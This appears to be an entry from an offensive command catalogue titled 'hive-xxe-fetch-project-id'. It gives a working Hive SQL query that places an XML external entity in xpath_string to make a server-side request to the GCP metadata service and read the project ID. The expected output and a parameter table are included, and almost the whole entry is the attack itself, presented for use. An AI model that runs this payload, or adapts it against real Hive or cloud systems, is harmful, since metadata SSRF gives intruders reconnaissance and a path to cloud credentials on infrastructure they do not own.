---
id: uuid-c4
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
tags:
  - xxe
  - ssrf
type: command
output: en-development
executor: sql
platforms:
  - GCP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.606Z'
verified: false
validated: true
submitted: true
---
# hive-xxe-fetch-project-id

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Description

Executes XXE in Hive's xpath_string to SSRF GCP metadata and fetch project ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SYSTEM | Metadata URL for project-id | Yes |
| LIMIT 5 | Result limit | Yes |
| FROM test | Query table | Yes |

## Examples

### Basic Usage

```sql
select xpath_string(...) FROM test LIMIT 5;
```

## Expected Output

'en-development'

## Related

- [[Related Procedure: Execute-XXE-to-Fetch-GCP-Project-ID]]
